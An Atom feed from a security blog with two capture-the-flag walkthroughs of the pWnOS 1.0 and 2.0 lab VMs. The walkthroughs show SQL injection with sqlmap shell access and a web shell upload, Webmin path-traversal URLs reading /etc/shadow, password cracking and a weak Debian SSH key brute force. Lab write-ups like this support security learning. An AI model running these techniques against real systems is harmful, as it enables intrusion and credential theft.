<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Pwnos | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/pwnos/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-07-04T15:46:55+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[pWnOS: 2.0]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0/"/>
    <updated>2015-05-22T08:40:50+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">pWnOS: 2.0 (Pre-Release)</a></p>

<p>Nmap output:
{% codeblock %}
root@kali32:~# nmap 10.10.10.100 -sV -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-04-27 14:45 CEST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 14:45 (0:00:06 remaining)
Nmap scan report for 10.10.10.100
Host is up (0.00030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
MAC Address: 00:0C:29:61:0D:EB (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds
{% endcodeblock %}</p>

<p>Nikto output:
{% codeblock %}
root@kali32:~# nikto -h 10.10.10.100</p>

<h2>- Nikto v2.1.6</h2>

<ul>
<li>Target IP:          10.10.10.100</li>
<li>Target Hostname:    10.10.10.100</li>
<li>Target Port:        80

<ul>
<li>Start Time:         2015-04-27 14:46:59 (GMT2)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache/2.2.17 (Ubuntu)</li>
<li>Cookie PHPSESSID created without the httponly flag</li>
<li>Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>Uncommon header &lsquo;tcn&rsquo; found, with contents: list</li>
<li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.</a> The following alternatives for &lsquo;index&rsquo; were found: index.php</li>
<li>Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</li>
<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
<li>OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-3268: /includes/: Directory indexing found.</li>
<li>OSVDB-3092: /includes/: This might be interesting&hellip;</li>
<li>OSVDB-3092: /info/: This might be interesting&hellip;</li>
<li>OSVDB-3092: /login/: This might be interesting&hellip;</li>
<li>OSVDB-3092: /register/: This might be interesting&hellip;</li>
<li>OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</li>
<li>OSVDB-3268: /icons/: Directory indexing found.</li>
<li>Server leaks inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 12:48:10 2007</li>
<li>OSVDB-3233: /icons/README: Apache default file found.</li>
<li>OSVDB-5292: /info.php?file=<a href="http://cirt.net/rfiinc.txt?:">http://cirt.net/rfiinc.txt?:</a> RFI from RSnake&rsquo;s list (<a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat</a>) or from <a href="http://osvdb.org/">http://osvdb.org/</a></li>
<li>/login.php: Admin login page/section found.</li>
<li>7331 requests: 0 error(s) and 22 item(s) reported on remote host

<ul>
<li>End Time:           2015-04-27 14:47:09 (GMT2) (10 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
{% endcodeblock %}</li>
</ul>


<p>There is a SQL injection in email, we can see an error message trying to log in (filling an email field with the single quote):
{% codeblock %}
<a href="http://10.10.10.100/login.php:">http://10.10.10.100/login.php:</a></p>

<p>An error occurred in script &lsquo;/var/www/login.php&rsquo; on line 47: Query: SELECT *
FROM users WHERE email=&lsquo;&rsquo;&lsquo; AND pass=&#8217;86f7e437faa5a7fce15d1ddcb9eaeaea377667b8&rsquo;
AND active IS NULL</p>

<p>MySQL Error: You have an error in your SQL syntax; check the
manual that corresponds to your MySQL server version for the right syntax to
use near &lsquo;86f7e437faa5a7fce15d1ddcb9eaeaea377667b8&rsquo; AND active IS NULL&#8217; at line 1
{% endcodeblock %}</p>

<p>Using Sqlmap we dump the whole databases:
{% codeblock %}
$ sqlmap -u &ldquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rdquo; &ndash;forms &ndash;dump-all
[ .. snip .. ]
email=test@test.com&amp;pass=123&amp;submit=Login&amp;submitted=TRUE
{% endcodeblock %}</p>

<p>We try to crack hashes but without success in the reasonable time:
{% codeblock %}
root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat mysql/user-f3649c95.csv | cut -d, -f2-3 | sed &rsquo;s#,#:#&lsquo; > /tmp/hashes.csv
root@kali32:~/.sqlmap/output/10.10.10.100/dump# john &ndash;format=mysql-sha1 /tmp/hashes.csv
[ .. snip .. ]
root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat ch16/users.csv
user_id,pass,email,active,last_name,first_name,user_level,registration_date
1,c2c4b4e51d9e23c02c15702c136c3e950ba9a4af,admin@isints.com,NULL,Privett,Dan,0,2011-05-07 17:27:01
{% endcodeblock %}</p>

<p>With OS Shell functionality of Sqlmap (&ndash;os-shell), we was able to obtain shell with the web user privileges:
{% codeblock %}
os-shell> cat /etc/passwd
do you want to retrieve the command standard output? [Y/n/a] y</p>

<h2>command standard output:</h2>

<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
landscape:x:104:110::/var/lib/landscape:/bin/false
dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
{% endcodeblock %}</p>

<p>As we can see, MySQL daemon is running as root (=uid 0), this is also the
reason, why we were able to write something with database user to /var/www
(owned by www-data), that&rsquo;s not common.</p>

<p>We can also upload weevely to the remote system and use it as the more sophisticated shell:
{% codeblock %}
root@kali32:~# sqlmap -u &ldquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rdquo; &ndash;data &ldquo;email=test@test.com&amp;pass=123&amp;submit=Login&amp;submitted=TRUE&rdquo; &ndash;file-write=&ldquo;/var/www/weevely.php.txt&rdquo; &ndash;file-dest=/var/www/w.php
{% endcodeblock %}</p>

<p>We found the database credentials, however they didn&rsquo;t work:
{% codeblock lang:php %}
www-data@web:/var/www $ cat mysqli_connect.php
&lt;?php # Script 8.2 - mysqli_connect.php</p>

<p>// This file contains the database access information.
// This file also establishes a connection to MySQL
// and selects the database.</p>

<p>// Set the database access information as constants:</p>

<p>DEFINE (&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
DEFINE (&lsquo;DB_PASSWORD&rsquo;, &lsquo;goodday&rsquo;);
DEFINE (&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
DEFINE (&lsquo;DB_NAME&rsquo;, &lsquo;ch16&rsquo;);</p>

<p>// Make the connection:</p>

<p>$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die (&lsquo;Could not connect to MySQL: &rsquo; . mysqli_connect_error() );</p>

<p>?>
{% endcodeblock %}</p>

<p>That was strange, because the web application is connected. After a little more digging, we found this suspicious file:
{% codeblock lang:php %}
www-data@web:/var/www $ cat ../mysqli_connect.php
&lt;?php # Script 8.2 - mysqli_connect.php</p>

<p>// This file contains the database access information.
// This file also establishes a connection to MySQL
// and selects the database.</p>

<p>// Set the database access information as constants:</p>

<p>DEFINE (&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
DEFINE (&lsquo;DB_PASSWORD&rsquo;, &lsquo;root@ISIntS&rsquo;);
DEFINE (&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
DEFINE (&lsquo;DB_NAME&rsquo;, &lsquo;ch16&rsquo;);</p>

<p>// Make the connection:</p>

<p>$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die (&lsquo;Could not connect to MySQL: &rsquo; . mysqli_connect_error() );</p>

<p>?>
{% endcodeblock %}</p>

<p>The <a href="http://10.10.10.100/blog/index.php">blog application</a> uses the text files instead of MySQL. We were only
able to locate the password file, without cracking it:
{% codeblock %}
www-data@web:/var/www $ cat blog/config/password.txt
$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
{% endcodeblock %}</p>

<p>Using root / root@ISIntS we can finally log in via ssh as root:
{% codeblock %}
root@web:~# cat /etc/shadow
root:$6$aO1TGdyc$XfiMyap/.QYhjIip5xxrgpO1ydlo.DQXns3fYYLt1hiH4Fp0PJP4TMoDSg3wpAFklF03dV2cUDL04YcR9bSSI/:15101:0:99999:7:::
daemon:<em>:15101:0:99999:7:::
bin:</em>:15101:0:99999:7:::
sys:<em>:15101:0:99999:7:::
sync:</em>:15101:0:99999:7:::
games:<em>:15101:0:99999:7:::
man:</em>:15101:0:99999:7:::
lp:<em>:15101:0:99999:7:::
mail:</em>:15101:0:99999:7:::
<a href="news:*:15101:0:99999:7:::">news:*:15101:0:99999:7:::</a>
uucp:<em>:15101:0:99999:7:::
proxy:</em>:15101:0:99999:7:::
www-data:<em>:15101:0:99999:7:::
backup:</em>:15101:0:99999:7:::
list:<em>:15101:0:99999:7:::
irc:</em>:15101:0:99999:7:::
gnats:<em>:15101:0:99999:7:::
nobody:</em>:15101:0:99999:7:::
libuuid:!:15101:0:99999:7:::
syslog:<em>:15101:0:99999:7:::
mysql:!:15101:0:99999:7:::
sshd:</em>:15101:0:99999:7:::
landscape:*:15101:0:99999:7:::
dan:$6$Iu1ipXkP$F9Jdj7JNf56/UjrXgOTks3mqYO6J/ErWUtf.EWr2AT8lv6aHy3K6Ywjmd7HCUswgiEYDHMwq/aqwJToXl0ERs1:15101:0:99999:7:::
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pWnOS: 1.0]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0/"/>
    <updated>2015-05-10T12:13:34+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/pwnos-1-dot-0</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0</a></p>

<p>Nmap output:
{% codeblock %}
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endcodeblock %}</p>

<p>After a while of browsing the web page, we found trivial LFI vulnerability:
{% codeblock %}
<a href="http://193.168.0.25/index1.php?help=true&amp;connect=../../../../etc/passwd">http://193.168.0.25/index1.php?help=true&amp;connect=../../../../etc/passwd</a></p>

<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
obama:x:1001:1001::/home/obama:/bin/bash
osama:x:1002:1002::/home/osama:/bin/bash
yomama:x:1003:1003::/home/yomama:/bin/bash
{% endcodeblock %}</p>

<p>We can find a lot of information querying the samba service too:
{% codeblock %}
root@kali:~/vulnhub/pwnos# nmblookup -A 192.168.0.25
Looking up status of 192.168.0.25
        UBUNTUVM        <00> -         H <ACTIVE>
        UBUNTUVM        <03> -         H <ACTIVE>
        UBUNTUVM        <20> -         H <ACTIVE>
        ..<strong>MSBROWSE</strong>. <01> - <GROUP> H <ACTIVE>
        MSHOME          <1d> -         H <ACTIVE>
        MSHOME          <1e> - <GROUP> H <ACTIVE>
        MSHOME          <00> - <GROUP> H <ACTIVE></p>

<pre><code>    MAC Address = 00-00-00-00-00-00
</code></pre>

<p>root@kali:~/vulnhub/pwnos# smbclient -L\UBUNTUVM -I 192.168.0.25 -N
Anonymous login successful
Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]</p>

<pre><code>    Sharename       Type      Comment
    ---------       ----      -------
    home            Disk      Home Directory for vmware User
    print$          Disk      Printer Drivers
    IPC$            IPC       IPC Service (ubuntuvm)
</code></pre>

<p>Anonymous login successful
Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]</p>

<pre><code>    Server               Comment
    ---------            -------
    UBUNTUVM             ubuntuvm

    Workgroup            Master
    ---------            -------
    MSHOME               UBUNTUVM
</code></pre>

<p>{% endcodeblock %}</p>

<p>There are a few enumeration modules in metasploit:
{% codeblock %}
msf exploit(usermap_script) > use auxiliary/scanner/smb/pipe_auditor
msf auxiliary(pipe_auditor) > setg RHOSTS 192.168.0.25
RHOSTS => 192.168.0.25
msf auxiliary(pipe_auditor) > exploit</p>

<p>[<em>] 192.168.0.25 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \lsass, \ntsvcs, \srvsvc, \wkssvc
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed</p>

<p>msf auxiliary(smb_enumshares) > use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(smb_enumusers) > exploit</p>

<p>[*] 192.168.0.25 UBUNTUVM [ games, nobody, proxy, syslog, www-data, root, news, bin, mail, dhcp, daemon, sshd, man, lp, mysql, gnats, backup, sys, klog, vmware, list, irc, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )</p>

<p>msf auxiliary(smb_login) > use auxiliary/scanner/smb/smb_lookupsid
msf auxiliary(smb_lookupsid) > exploit</p>

<p>[<em>] 192.168.0.25 PIPE(LSARPC) LOCAL(UBUNTUVM - 5-21-2952145021-507220021-499326276) DOMAIN(MSHOME - )
[</em>] 192.168.0.25 USER=nobody RID=501
[<em>] 192.168.0.25 GROUP=None RID=513
[</em>] 192.168.0.25 USER=root RID=1000
[<em>] 192.168.0.25 USER=daemon RID=1002
[</em>] 192.168.0.25 USER=bin RID=1004
[<em>] 192.168.0.25 USER=sys RID=1006
[</em>] 192.168.0.25 USER=sync RID=1008
[<em>] 192.168.0.25 USER=games RID=1010
[</em>] 192.168.0.25 USER=man RID=1012
[<em>] 192.168.0.25 USER=lp RID=1014
[</em>] 192.168.0.25 USER=mail RID=1016
[<em>] 192.168.0.25 USER=news RID=1018
[</em>] 192.168.0.25 USER=uucp RID=1020
[<em>] 192.168.0.25 USER=proxy RID=1026
[</em>] 192.168.0.25 USER=www-data RID=1066
[<em>] 192.168.0.25 USER=backup RID=1068
[</em>] 192.168.0.25 USER=list RID=1076
[<em>] 192.168.0.25 USER=irc RID=1078
[</em>] 192.168.0.25 USER=gnats RID=1082
[<em>] 192.168.0.25 USER=dhcp RID=1200
[</em>] 192.168.0.25 USER=syslog RID=1202
[<em>] 192.168.0.25 USER=klog RID=1204
[</em>] 192.168.0.25 USER=mysql RID=1206
[<em>] 192.168.0.25 USER=sshd RID=1208
[</em>] 192.168.0.25 USER=vmware RID=3000
[<em>] 192.168.0.25 UBUNTUVM [nobody, root, daemon, bin, sys, sync, games, man, lp, mail, news, uucp, proxy, www-data, backup, list, irc, gnats, dhcp, syslog, klog, mysql, sshd, vmware ]
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
{% endcodeblock %}</p>

<p>The webmin is vulnerable and the exploit in metasploit:
{% codeblock %}
       Name: Webmin File Disclosure
     Module: auxiliary/admin/webmin/file_disclosure
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2006-06-30
{% endcodeblock %}</p>

<p>Basically the exploitation could be performed on command line to disclose arbitrary file, for example:
{% codeblock %}
<a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf</a></p>

<p><a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users</a></p>

<p><a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem</a>
{% endcodeblock %}</p>

<p>{% codeblock %}
<a href="http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow">http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow</a></p>

<p>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
daemon:<em>:14040:0:99999:7:::
bin:</em>:14040:0:99999:7:::
sys:<em>:14040:0:99999:7:::
sync:</em>:14040:0:99999:7:::
games:<em>:14040:0:99999:7:::
man:</em>:14040:0:99999:7:::
lp:<em>:14040:0:99999:7:::
mail:</em>:14040:0:99999:7:::
<a href="news:*:14040:0:99999:7:::">news:*:14040:0:99999:7:::</a>
uucp:<em>:14040:0:99999:7:::
proxy:</em>:14040:0:99999:7:::
www-data:<em>:14040:0:99999:7:::
backup:</em>:14040:0:99999:7:::
list:<em>:14040:0:99999:7:::
irc:</em>:14040:0:99999:7:::
gnats:<em>:14040:0:99999:7:::
nobody:</em>:14040:0:99999:7:::
dhcp:!:14040:0:99999:7:::
syslog:!:14040:0:99999:7:::
klog:!:14040:0:99999:7:::
mysql:!:14040:0:99999:7:::
sshd:!:14040:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
{% endcodeblock %}</p>

<p>Using john on /etc/shadow, we obtain credentials of user vmware for successful login to the system:
{% codeblock %}
h4ckm3           (vmware)
{% endcodeblock %}</p>

<p>The box could be rooted using standard vmsplice exploit.</p>

<p>However, there is another way to get user account. The script
<a href="https://wiki.debian.org/SSLkeys#Testing_keys_using_dowkd.pl">dowkd.pl</a> ensures
us that the OpenSSL is vulnerable
(<a href="https://security-tracker.debian.org/tracker/CVE-2008-0166">CVE-2008-0166</a>).</p>

<p>We download and unpack already generated RSA keys from offensive-security repository:
{% codeblock %}
$ wget <a href="https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2">https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/debian_ssh_rsa_2048_x86.tar.bz2</a>
{% endcodeblock %}</p>

<p>Because usage of weak private keys could be blacklisted on our server, we use
the following
<a href="https://unix.stackexchange.com/questions/109908/public-key-f36e8704ea2db360ff42ad26671794d5-blacklisted-see-ssh">instructions</a>
to enable them.</p>

<p>Basically adding this directive to our ssh_config file should be sufficient:
{% codeblock %}
UseBlacklistedKeys yes
{% endcodeblock %}</p>

<p>In exploitdb, we use python script to try every possible private key:
{% codeblock %}
$ python platforms/linux/remote/5720.py /tmp/rsa/2048 192.168.0.25 obama</p>

<p>Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
Execute: ssh -lobama -p22 -i /tmp/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.0.25
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
